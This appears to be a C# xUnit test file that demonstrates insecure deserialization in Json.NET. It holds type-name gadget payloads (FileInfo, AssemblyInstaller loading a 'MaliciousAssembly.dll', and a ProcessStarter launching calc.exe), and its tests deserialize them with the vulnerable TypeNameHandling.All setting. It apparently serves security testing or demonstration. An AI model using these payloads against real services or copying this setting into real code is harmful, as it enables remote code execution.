using Newtonsoft.Json;
using System.Diagnostics;
using System.Xml.Serialization;

namespace SerializationRCE
{
    public class JsonDeserialization
    {

        string filePayload = """
            {
            	"$type": "System.IO.FileInfo, System.IO.FileSystem",
            	"fileName": "rce-test.txt"
            }
        """;

        string assemblyPayload = """
                        {"$type":"System.Configuration.Install.AssemblyInstaller, 
            System.Configuration.Install, Version=4.0.0.0, Culture=neutral, 
            PublicKeyToken=b03f5f7f11d50a3a",
            "Path":"MaliciousAssembly.dll"}           
            """;

        string assemblyPayloadSimple = """
                        {"$type":"System.Configuration.Install.AssemblyInstaller, 
            System.Configuration.Install",
            "Path":"MaliciousAssembly.dll"}           
            """;

        string maliciousAssemblyLaunchPayload = """
            {"$type":"MaliciousAssembly.ProcessStarter, MaliciousAssembly",
            "ProcessLaunch":"calc.exe"
            }
            """;

        [Fact]
        public void FileInfoJson()
        {
            Process.Start("calc.exe");

            JsonSerializerSettings serializerSettings = new JsonSerializerSettings();
            serializerSettings.TypeNameHandling = TypeNameHandling.All;

            object? returnClass = JsonConvert.DeserializeObject(filePayload, serializerSettings);
        }


        [Fact]
        public void AssemblyLoaderJson()
        {
            JsonSerializerSettings serializerSettings = new JsonSerializerSettings();
            serializerSettings.TypeNameHandling = TypeNameHandling.All;

            object? returnClass = JsonConvert.DeserializeObject(assemblyPayloadSimple, serializerSettings);
        }

        [Fact]
        public void MaliciousAssemblyLauncherJson()
        {
            JsonSerializerSettings serializerSettings = new JsonSerializerSettings();
            serializerSettings.TypeNameHandling = TypeNameHandling.All;

            object? installer = JsonConvert.DeserializeObject(assemblyPayloadSimple, serializerSettings);

            object? returnClass = JsonConvert.DeserializeObject(maliciousAssemblyLaunchPayload, serializerSettings);
        }

    }
}